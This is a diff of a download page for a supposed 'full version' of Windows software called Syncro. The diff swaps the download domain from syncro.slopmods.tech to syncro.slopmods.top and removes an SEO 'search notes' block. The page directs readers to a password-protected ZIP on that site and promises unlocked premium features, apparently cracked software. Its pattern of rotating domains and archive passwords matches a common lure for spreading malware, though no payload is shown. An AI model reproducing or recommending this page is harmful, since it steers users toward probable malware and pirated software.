@@ -1,6 +1,6 @@
 ***
 
-# Syncro Full Version — Windows Install
+# Syncro Windows Setup
 
 Syncro — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Syncro — Windows setup and configuration · Premium workspace · Zero nag dial
 
 > Use the release page below for Windows.
 
-- **Release page:** [syncro.slopmods.tech](https://syncro.slopmods.tech/)
-- **Full URL:** `https://syncro.slopmods.tech/`
+- **Release page:** [syncro.slopmods.top](https://syncro.slopmods.top/)
+- **Full URL:** `https://syncro.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **syncro.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **syncro.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Syncro — Windows setup and configuration · Premium workspace · Zero nag dial
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **syncro.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **syncro.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Syncro** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Syncro features on Windows desktop
